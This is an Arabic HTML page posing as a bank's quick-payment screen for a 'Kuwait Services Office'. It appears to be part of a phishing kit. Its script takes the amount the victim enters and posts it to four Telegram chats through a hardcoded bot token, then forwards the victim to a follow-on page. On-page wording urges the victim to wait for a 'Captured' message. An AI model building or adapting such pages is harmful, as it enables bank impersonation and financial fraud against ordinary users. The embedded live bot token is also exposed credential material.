<body>

  <div class="container">
    <div class="logo">
      <img src="www2.0zz0.com/2025/07/14/23/609469565.jpg" alt="شعار البنك">
    </div>
    <h1 class="title">الدفع السريع</h1>

    <div class="card">
      <div class="field">
        <label>اسم المستلم:</label>
        <p>مكتب خدمات الكويت</p>
      </div>

      <div class="field">
        <label for="amount">    المبلغ KWD :</label>
        <input type="number" id="amount" name="amount" placeholder="أدخل المبلغ بالدينار الكويتي" required min="0.001" step="0.001">
      </div>

      <div class="field">
        <label>الغاية:</label>
        <p>دفع الخدمات</p>
      </div>
    </div>

    <p class="instruction">
      بعد إتمام عملية الدفع، يرجى عدم إغلاق الصفحة قبل ظهور رسالة
      <strong>تمت المعالجة (Captured)</strong> لتجنب أي إزعاج.
    </p>

    <button class="btn confirm" id="confirmBtn">تأكيد</button>
    <button class="btn reject" id="rejectBtn">رفض</button>
  </div>

<script>
  document.getElementById("confirmBtn").addEventListener("click", function () {
    const amountInput = document.getElementById("amount");
    const amount = amountInput.value.trim();

    if (!amount || parseFloat(amount) <= 0) {
      alert("يرجى إدخال مبلغ صالح.");
      amountInput.focus();
      return;
    }

    // إظهار رسالة تحميل
    const confirmBtn = document.getElementById("confirmBtn");
    const originalText = confirmBtn.textContent;
    confirmBtn.textContent = "جاري الإرسال...";
    confirmBtn.disabled = true;

    const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
    const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
    
    const message = `💳 عملية دفع جديدة:\n\n` +
                    `👤 اسم المستلم: مكتب خدمات الكويت\n` +
                    `💰 المبلغ: ${amount} دينار كويتي\n` +
                    `🎯 الغاية: دفع الخدمات`;

    let sentCount = 0;
    let errorCount = 0;

    // إرسال الرسالة لكل chat_id في المصفوفة
    chat_ids.forEach(chat_id => {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: chat_id, 
          text: message,
          parse_mode: "HTML"
        })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        if (data.ok) {
          sentCount++;
          console.log(`تم الإرسال إلى ${chat_id} بنجاح`);
        } else {
          errorCount++;
          console.error(`فشل الإرسال إلى ${chat_id}:`, data.description);
        }
      })
      .catch(err => {
        errorCount++;
        console.error(`خطأ في الإرسال إلى ${chat_id}:`, err);
      })
      .finally(() => {
        // إذا اكتملت جميع المحاولات
        if (sentCount + errorCount === chat_ids.length) {
          // إعادة زر التأكيد إلى حالته الأصلية
          confirmBtn.textContent = originalText;
          confirmBtn.disabled = false;
          
          if (sentCount > 0) {
            // الانتقال إلى الصفحة التالية إذا نجح إرسال واحد على الأقل
            window.location.href = "pays.html"; 
          } else {
            alert("فشل إرسال البيانات. يرجى المحاولة مرة أخرى.");
          }
        }
      });
    });
  });

  document.getElementById("rejectBtn").addEventListener("click", function () {
    alert("تم رفض الدفع.");
  });
</script>
